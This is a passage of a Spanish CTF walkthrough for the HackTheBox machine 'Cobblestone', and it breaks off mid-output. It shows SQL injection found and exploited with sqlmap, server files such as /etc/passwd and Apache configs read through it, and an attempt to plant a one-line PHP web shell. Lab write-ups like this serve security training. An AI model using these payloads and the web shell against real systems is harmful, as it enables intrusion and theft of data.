---
hidden: true
icon: flag
---

# Cobblestone HackTheBox (Insane)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-07 10:16 EDT
Nmap scan report for 10.10.11.81
Host is up (0.033s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 50:ef:5f:db:82:03:36:51:27:6c:6b:a6:fc:3f:5a:9f (ECDSA)
|_  256 e2:1d:f3:e9:6a:ce:fb:e0:13:9b:07:91:28:38:ec:5d (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Did not follow redirect to http://cobblestone.htb/
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.73 seconds
```

Veremos varios puertos interesantes, entre ellos el puerto `80` que aloja una pagina web en la cual vemos que nos esta redirigiendo a un `dominio` llamado `cobblestone.htb`, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>              cobblestone.htb
```

Lo guardamos y entraremos a dicho dominio para ver que vemos.

```
URL = http://cobblestone.htb/
```

Veremos una pagina web dedicada a `Minecraft`, veremos `3` opciones en las cuales si le damos a `Get you won` nos llevara a un `subdominio` llamado `deploy.cobblestone.htb`, si le damos a `Skin Database` nos llevara a un `login` en el que hay un `register` y por ultimo si le damos a `Vote (Beta)` nos llevara a otro subdominio llamado `vote.cobblestone.htb`, vamos añadir los `2` `subdominios` a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>             cobblestone.htb deploy.cobblestone.htb vote.cobblestone.htb
```

Lo guardamos y recargamos las `2` paginas para que ahora si haga bien la conexion.

```
URL = http://vote.cobblestone.htb/
URL = http://deploy.cobblestone.htb/
```

En el de `vote...` tendremos que tener una cuenta para `"votar"` y en el de `deploy...` veremos una serie de `skins` con una descripcion de cada una y sus nombres.

Vamos a registrarnos en la pagina metiendo los datos solicitados, echo eso, le daremos a `login` para meter las credenciales creadas en el registro, una vez dentro veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251007162941.png" alt=""><figcaption></figcaption></figure>

Vemos una pagina en la cual vemos varias `skins` si le damos al boton de descargar nos descarga el `texture pack` de dicha `skin` por lo que de momento nada interesante.

Pero si nos `logueamos` en el de `vote...` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251007163154.png" alt=""><figcaption></figcaption></figure>

Vemos que hay un `subdominio` llamado `mc.cobblestone.htb` vamos añadirlo tambien a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>            cobblestone.htb deploy.cobblestone.htb vote.cobblestone.htb mc.cobblestone.htb
```

Lo guardamos y si entramos por dicho `dominio` vemos que hace la misma resolucion y nos muestra lo mismo que en el dominio principal, por lo que nada interesante por el momento.

Si nos vamos en `vote` a la parte de `Suggest` veremos esto:

<figure><img src="../../.gitbook/assets/Pasted image 20251007164001.png" alt=""><figcaption></figcaption></figure>

Si probamos a meter un `payload` simple como `' OR 1=1-- -` en la parte de meter la `URL` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251007164044.png" alt=""><figcaption></figcaption></figure>

Vemos que en vez de mostrar el `payload` metido, muestra el primer servidor que hay, ya que si metemos cualquier palabra, deberia de aparecer esto:

<figure><img src="../../.gitbook/assets/Pasted image 20251007164127.png" alt=""><figcaption></figcaption></figure>

Vamos a probarlo con un `sqlmap` de esta forma:

## sqlmap

Vamos abrir `BurpSuite` y capturar la peticion de cuando enviamos la `URL` con cualquier palabra que sea.

> req.txt

```
POST /suggest.php HTTP/1.1
Host: vote.cobblestone.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Origin: http://vote.cobblestone.htb
Connection: keep-alive
Referer: http://vote.cobblestone.htb/index.php
Cookie: PHPSESSID=aj7neu2h7c1m8dlqf7iub23p1d
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=test
```

Una vez guardado en un archivo la peticion vamos a lanzar `sqlmap` de esta forma:

```shell
sqlmap -r req.txt --method=POST --batch --dbs
```

Info:

```
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.8#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:44:22 /2025-10-07/

[10:44:22] [INFO] parsing HTTP request from 'req.txt'
[10:44:22] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=6'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[10:44:22] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:44:22] [INFO] testing if the target URL content is stable
[10:44:23] [WARNING] POST parameter 'url' does not appear to be dynamic
[10:44:23] [WARNING] heuristic (basic) test shows that POST parameter 'url' might not be injectable
[10:44:23] [INFO] testing for SQL injection on POST parameter 'url'
[10:44:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:44:23] [INFO] POST parameter 'url' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[10:44:25] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[10:44:25] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[10:44:26] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[10:44:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[10:44:26] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[10:44:26] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[10:44:26] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[10:44:26] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[10:44:26] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[10:44:26] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:44:26] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:44:26] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:44:27] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:44:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[10:44:27] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[10:44:27] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:44:27] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[10:44:27] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[10:44:27] [WARNING] reflective value(s) found and filtering out
[10:44:27] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[10:44:27] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[10:44:27] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[10:44:27] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[10:44:27] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[10:44:27] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[10:44:27] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[10:44:27] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[10:44:27] [INFO] testing 'Generic inline queries'
[10:44:27] [INFO] testing 'MySQL inline queries'
[10:44:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[10:44:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[10:44:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[10:44:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[10:44:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[10:44:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[10:44:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:44:38] [INFO] POST parameter 'url' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[10:44:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:44:38] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:44:39] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:44:39] [INFO] target URL appears to have 5 columns in query
[10:44:40] [INFO] POST parameter 'url' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'url' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=test' AND 7323=7323 AND 'XFOM'='XFOM

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=test' AND (SELECT 8033 FROM (SELECT(SLEEP(5)))DhKr) AND 'GzyX'='GzyX

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-1513' UNION ALL SELECT NULL,CONCAT(0x7170707871,0x6669756b4d6c7a584d47634b75644e6f42454c76497a58454243665064464a596a4c7758416f4676,0x716b6a7171),NULL,NULL,NULL-- -
---
[10:44:40] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:44:40] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] vote

[10:44:40] [INFO] fetched data logged to text files under '/root/.sqlmap/output/vote.cobblestone.htb'

[*] ending @ 10:44:40 /2025-10-07/
```

Vemos que ha funcionado, vamos a sacar la info de la `DDBB` llamada `vote`.

```shell
sqlmap -r req.txt --method=POST --batch -D vote --tables
```

Info:

```
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.8#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:45:28 /2025-10-07/

[10:45:28] [INFO] parsing HTTP request from 'req.txt'
[10:45:28] [INFO] resuming back-end DBMS 'mysql' 
[10:45:28] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=86'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=test' AND 7323=7323 AND 'XFOM'='XFOM

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=test' AND (SELECT 8033 FROM (SELECT(SLEEP(5)))DhKr) AND 'GzyX'='GzyX

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-1513' UNION ALL SELECT NULL,CONCAT(0x7170707871,0x6669756b4d6c7a584d47634b75644e6f42454c76497a58454243665064464a596a4c7758416f4676,0x716b6a7171),NULL,NULL,NULL-- -
---
[10:45:28] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:45:28] [INFO] fetching tables for database: 'vote'
Database: vote
[2 tables]
+-------+
| users |
| votes |
+-------+

[10:45:28] [INFO] fetched data logged to text files under '/root/.sqlmap/output/vote.cobblestone.htb'

[*] ending @ 10:45:28 /2025-10-07/
```

Vemos que hay `2` tablas llamadas `users` y `votes`, vamos a ver la info de las `2`.

```shell
sqlmap -r req.txt --method=POST --batch -D vote -T votes --dump # Tabla votes
sqlmap -r req.txt --method=POST --batch -D vote -T users --dump # Tabla users
```

Pero no nos soltara informacion por alguna razon, ya que la informacion ahora mismo no tenemos, vamos a probar si pudieramos realizar un `RCE` desde esta vulnerabilidad de `SQLi`.

```shell
sqlmap -r req.txt --method=POST --batch --file-read="/etc/passwd"
```

Info:

```
        ___
       __H__                                                                                                                                                 
 ___ ___[)]_____ ___ ___  {1.9.8#stable}                                                                                                                     
|_ -| . ["]     | .'| . |                                                                                                                                    
|___|_  ["]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:54:54 /2025-10-07/

[10:54:54] [INFO] parsing HTTP request from 'req.txt'
[10:54:54] [INFO] resuming back-end DBMS 'mysql' 
[10:54:54] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=305'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=test' AND 7323=7323 AND 'XFOM'='XFOM

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=test' AND (SELECT 8033 FROM (SELECT(SLEEP(5)))DhKr) AND 'GzyX'='GzyX

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-1513' UNION ALL SELECT NULL,CONCAT(0x7170707871,0x6669756b4d6c7a584d47634b75644e6f42454c76497a58454243665064464a596a4c7758416f4676,0x716b6a7171),NULL,NULL,NULL-- -
---
[10:54:54] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:54:54] [INFO] fingerprinting the back-end DBMS operating system
[10:54:54] [INFO] the back-end DBMS operating system is Linux
[10:54:54] [INFO] fetching file: '/etc/passwd'
do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[10:54:55] [INFO] the local file '/root/.sqlmap/output/vote.cobblestone.htb/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (1430 B)
files saved to [1]:
[*] /root/.sqlmap/output/vote.cobblestone.htb/files/_etc_passwd (same file)

[10:54:55] [INFO] fetched data logged to text files under '/root/.sqlmap/output/vote.cobblestone.htb'

[*] ending @ 10:54:55 /2025-10-07/
```

Veremos que ha descargado el archivo de forma correcta, ahora si lo leemos:

### Lectura con un SQLi

```shell
cat /root/.sqlmap/output/vote.cobblestone.htb/files/_etc_passwd
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
cobble:x:1000:1000:cobble,,,:/home/cobble:/bin/rbash
mysql:x:103:112:MySQL Server,,,:/nonexistent:/bin/false
tftp:x:104:113:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin
_laurel:x:999:996::/var/log/laurel:/bin/false
john:x:1001:1001:,,,:/home/john:/bin/bash
```

Veremos que ha funcionado, pero de poco nos sirve leer archivos, vamos a probar a intentar subir alguna `webshell` o algo parecido.

Antes vamos a ver que directorios hay en el sistema desde este archivo:

```shell
sqlmap -r req.txt --method=POST --batch --file-read="/etc/apache2/sites-enabled/000-default.conf"
```

Info:

```
        ___
       __H__                                                                                                                                                 
 ___ ___["]_____ ___ ___  {1.9.8#stable}                                                                                                                     
|_ -| . [(]     | .'| . |                                                                                                                                    
|___|_  [']_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:05:17 /2025-10-07/

[11:05:17] [INFO] parsing HTTP request from 'req.txt'
[11:05:17] [INFO] resuming back-end DBMS 'mysql' 
[11:05:17] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=22'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=test' AND 7323=7323 AND 'XFOM'='XFOM

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=test' AND (SELECT 8033 FROM (SELECT(SLEEP(5)))DhKr) AND 'GzyX'='GzyX

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-1513' UNION ALL SELECT NULL,CONCAT(0x7170707871,0x6669756b4d6c7a584d47634b75644e6f42454c76497a58454243665064464a596a4c7758416f4676,0x716b6a7171),NULL,NULL,NULL-- -
---
[11:05:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:05:17] [INFO] fingerprinting the back-end DBMS operating system
[11:05:17] [INFO] the back-end DBMS operating system is Linux
[11:05:17] [INFO] fetching file: '/etc/apache2/sites-enabled/000-default.conf'
do you want confirmation that the remote file '/etc/apache2/sites-enabled/000-default.conf' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[11:05:17] [INFO] the local file '/root/.sqlmap/output/vote.cobblestone.htb/files/_etc_apache2_sites-enabled_000-default.conf' and the remote file '/etc/apache2/sites-enabled/000-default.conf' have the same size (1334 B)                                                                                              
files saved to [1]:
[*] /root/.sqlmap/output/vote.cobblestone.htb/files/_etc_apache2_sites-enabled_000-default.conf (same file)

[11:05:17] [INFO] fetched data logged to text files under '/root/.sqlmap/output/vote.cobblestone.htb'

[*] ending @ 11:05:17 /2025-10-07/
```

Ahora vamos a leer el archivo:

```shell
cat /root/.sqlmap/output/vote.cobblestone.htb/files/_etc_apache2_sites-enabled_000-default.conf
```

Info:

```
<VirtualHost *:80>
        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^cobblestone.htb$
        RewriteRule /.* http://cobblestone.htb/ [R]
        ServerName 127.0.0.1
        ProxyPass "/cobbler_api" "http://127.0.0.1:25151/"
        ProxyPassReverse "/cobbler_api" "http://127.0.0.1:25151/"
</VirtualHost>

<VirtualHost *:80>
        ServerName cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/html

        <Directory /var/www/html>
                AAHatName cobblestone
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^cobblestone.htb$
        RewriteRule /.* http://cobblestone.htb/ [R]

        Alias /cobbler /srv/www/cobbler

        <Directory /srv/www/cobbler>
                Options Indexes FollowSymLinks
                AllowOverride None
                Require all granted
        </Directory>

</VirtualHost>

<VirtualHost *:80>
        ServerName deploy.cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/deploy

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^deploy.cobblestone.htb$
        RewriteRule /.* http://deploy.cobblestone.htb/ [R]
</VirtualHost>

<VirtualHost *:80>
        ServerName vote.cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/vote

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^vote.cobblestone.htb$
        RewriteRule /.* http://vote.cobblestone.htb/ [R]
</VirtualHost>
```

Veremos que el de `deploy` y `vote` esta en los siguiente directorios.

```
/var/www/deploy
/var/www/vote
```

Vamos a probar si podemos escribir una `shell.php` en `/var/www/vote` de esta forma:

### Shell con www-data (No escalada)

> shell.php

```php
<?php system($_GET["cmd"]); ?>
```

Ahora desde `sqlmap`:

```shell
sqlmap -r req.txt --method=POST --batch --file-write="shell.php" --file-dest="/var/www/vote/shell.php"
```

Pero veremos que no funciona por permisos, despues de un rato buscando y probando archivos desde la ruta expuesta del `config` de `apache2` veremos que existe un archivo llamado `user.php` en `html`.

```shell
sqlmap -r req.txt --method=POST --batch --file-read="/var/www/html/user.php"
```

Info:

```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.10#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:13:26 /2025-10-30/

[12:13:26] [INFO] parsing HTTP request from 'req.txt'
[12:13:27] [INFO] resuming back-end DBMS 'mysql'
[12:13:27] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=115'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=test' AND 8431=8431 AND 'Hxdn'='Hxdn

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=test' AND (SELECT 8159 FROM (SELECT(SLEEP(5)))iyof) AND 'NlBa'='NlBa

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-5795' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71717a7a71,0x7a737744506276506541596c774b5456694d504342586759766d445a797157736e444b6f5577676c,0x716a7a7a71)-- -
---
[12:13:27] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[12:13:27] [INFO] fingerprinting the back-end DBMS operating system
[12:13:27] [INFO] the back-end DBMS operating system is Linux
[12:13:27] [INFO] fetching file: '/var/www/html/user.php'
do you want confirmation that the remote file '/var/www/html/user.php' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[12:13:27] [INFO] the local file '/root/.local/share/sqlmap/output/vote.cobblestone.htb/files/_var_www_html_user.php' and the remote file '/var/www/html/user.php' have the same size (3267 B)
files saved to [1]:
[*] /root/.local/share/sqlmap/output/vote.cobblestone.htb/files/_var_www_html_user.php (same file)

[12:13:27] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 12:13:27 /2025-10-30/
```

Vemos que ha funcionado, vamos a ver que contiene:

> user.php

```php
<?php

include("db/connection.php");
session_start(); // Make sure sessions are started for role checking and messages

if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'admin') {
    http_response_code(403); // Optional: send 403 Forbidden
    die('Access denied.');
}

$_SESSION['message'] = '';
$_SESSION['message_type'] = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $id = $_POST['id'] ?? null;
    $username = $_POST['name'] ?? 'empty';
    $firstname = $_POST['first'] ?? 'empty';
    $lastname = $_POST['last'] ?? 'empty';
    $email = $_POST['email'] ?? 'empty';
    $role = $_POST['role'] ?? 'user';
    $ip = $_SERVER['REMOTE_ADDR'];

    if ($id === "1" || $id === "2") {
        $_SESSION['message'] = "Error: You are not allowed to modify this user.";
        $_SESSION['message_type'] = 'error';
        header("Location: skins.php");
        exit();
    }

    if (!preg_match('/^[a-zA-Z0-9]+$/', $username)) {
        $_SESSION['message'] = "Username can only contain alphanumeric characters.";
        $_SESSION['message_type'] = 'error';
        header("Location: skins.php");
        exit();
    }

    if (!preg_match('/^[a-zA-Z0-9]+$/', $firstname)) {
        $_SESSION['message'] = "First name can only contain alphanumeric characters.";
        $_SESSION['message_type'] = 'error';
        header("Location: skins.php");
        exit();
    }

    if (!preg_match('/^[a-zA-Z0-9]+$/', $lastname)) {
        $_SESSION['message'] = "Last name can only contain alphanumeric characters.";
        $_SESSION['message_type'] = 'error';
        header("Location: skins.php");
        exit();
    }


    $stmt = $conn->prepare("SELECT register_ip FROM users WHERE id = ?");
    $stmt->bind_param("s", $id);
    $stmt->execute();
    $stmt->store_result();

    if ($stmt->num_rows === 1) {
        $stmt->bind_result($register_ip);
        $stmt->fetch();

        if ($register_ip !== $ip) {
            $_SESSION['message'] = "Error: You are not allowed to modify this user.";
            $_SESSION['message_type'] = 'error';
            header("Location: skins.php");
            exit();
        }
    } else {
        $_SESSION['message'] = "Error: User not found.";
        $_SESSION['message_type'] = 'error';
        header("Location: skins.php");
        exit();
    }

    $stmt->close();

    try {
        $stmt = $conn->prepare("UPDATE users SET username = ?, firstname = ?, lastname = ?, email = ?, role = ? WHERE ID = ?");
        $stmt->bind_param("sssssi", $username, $firstname, $lastname, $email, $role, $id);

        if ($stmt->execute()) {
            $_SESSION['message'] = "User changes saved successfully.";
            $_SESSION['message_type'] = 'success';
            header("Location: skins.php");
            exit();
        } else {
            $_SESSION['message'] = "User changes were not saved.";
            $_SESSION['message_type'] = 'error';
            header("Location: login.php");
            exit();
        }

        $stmt->close();
        $conn->close();

    } catch (PDOException $e) {
        $_SESSION['message'] = 'Error: ' . $e->getMessage();
        $_SESSION['message_type'] = 'error';
    }

    $stmt->close();
    $conn->close();

    header('Location: skins.php');
    exit;
}
?>
```

Veremos una ruta bastante interesante llamada `db/connection.php`, vamos a probar que contiene:

```shell
sqlmap -r req.txt --method=POST --batch --file-read="/var/www/html/db/connection.php"
```

Info:

```
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.10#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:14:36 /2025-10-30/

[12:14:36] [INFO] parsing HTTP request from 'req.txt'
[12:14:36] [INFO] resuming back-end DBMS 'mysql'
[12:14:36] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=156'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
